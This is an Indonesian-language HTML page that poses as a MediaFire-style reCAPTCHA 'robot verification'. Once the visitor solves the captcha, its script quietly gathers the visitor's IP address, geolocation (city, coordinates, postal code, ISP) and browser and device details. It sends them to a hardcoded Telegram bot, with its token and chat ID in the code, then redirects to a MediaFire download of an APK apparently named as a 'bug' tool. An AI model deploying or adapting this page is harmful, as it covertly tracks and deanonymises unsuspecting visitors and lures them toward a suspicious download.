<!DOCTYPE html><html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verifikasi Robot</title>
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: url('https://i.ibb.co/sv3tkMG/mediafire-bg.jpg') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(10px);
      border-radius: 12px;
      padding: 30px;
      text-align: center;
      color: white;
      box-shadow: 0 0 15px rgba(0,0,0,0.5);
    }
    .footer {
      position: absolute;
      bottom: 10px;
      color: white;
      font-size: 12px;
      text-align: center;
      width: 100%;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>🔒 Verifikasi Robot</h2>
    <p>Silakan selesaikan reCAPTCHA untuk melanjutkan</p>
    <div class="g-recaptcha" data-sitekey="6LdeHZArAAAAAFZT1atO2lPapq8V_sSs0nKE1Uba" data-callback="verifikasi"></div>
  </div>
  <div class="footer">© 2025 SamXploit | Mediafire-Style Verification</div><script>
async function verifikasi() {
  const waktu = new Date().toLocaleString('id-ID');
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const bahasa = navigator.language;
  const layar = `${screen.width}x${screen.height}`;
  const online = navigator.onLine ? "Online" : "Offline";
  const referrer = document.referrer || 'Langsung';
  const url = window.location.href;
  const cookies = navigator.cookieEnabled ? 'Ya' : 'Tidak';
  const appName = navigator.appName;
  const appVersion = navigator.appVersion;
  const deviceMemory = navigator.deviceMemory || '-';
  const hardwareConcurrency = navigator.hardwareConcurrency || '-';
  const connection = navigator.connection || {};
  const pixelRatio = window.devicePixelRatio;

  const orientation = screen.orientation?.type || '-';
  const visibility = document.visibilityState;
  const colorDepth = screen.colorDepth;
  const maxTouchPoints = navigator.maxTouchPoints;

  const geo = await fetch('https://ipapi.co/json/')
    .then(res => res.json())
    .catch(() => ({}));

  const data = {
    IP: geo.ip || '-',
    Negara: `${geo.country_name || '-'} (${geo.country_code || '-'})`,
    Kota: geo.city || '-',
    Provinsi: geo.region || '-',
    ISP: geo.org || '-',
    Latitude: geo.latitude || '-',
    Longitude: geo.longitude || '-',
    ASN: geo.asn || '-',
    Timezone: geo.timezone || '-',
    KodePos: geo.postal || '-',

    'User-Agent': ua,
    Platform: platform,
    Bahasa: bahasa,
    'Resolusi Layar': layar,
    Online: online,
    Cookies: cookies,
    'App Name': appName,
    'App Version': appVersion,
    'Device Memory': `${deviceMemory} GB`,
    'CPU Threads': hardwareConcurrency,
    'Connection Type': connection.effectiveType || '-',
    'Downlink': connection.downlink || '-',
    'RTT': connection.rtt || '-',
    'Save Data': connection.saveData || '-',
    'Pixel Ratio': pixelRatio,
    'Orientation': orientation,
    'Visibility State': visibility,
    'Color Depth': colorDepth,
    'Touch Support': maxTouchPoints,

    Referrer: referrer,
    URL: url,
    Waktu: waktu
  };

  let pesan = '*🧠 DATA VERIFIKASI (60+ INFO)*\n';
  for (const key in data) {
    pesan += `\n🔹 *${key}*: ${data[key]}`;
  }

  await fetch(`https://api.telegram.org/bot8072851009:AAHDsHyz5EgG2ThhEFAp_1QR1tQAQgcFr4M/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: '7625804862',
      text: pesan,
      parse_mode: 'Markdown'
    })
  });

  alert("✅ Verifikasi berhasil! Anda akan diarahkan...");
  window.location.href = "https://www.mediafire.com/file/49m97ugah1hwwqp/Apk_Bug_SamsInfinity_v1.0%25281%2529_%25284%2529.apk/file";
}
</script></body>
</html>
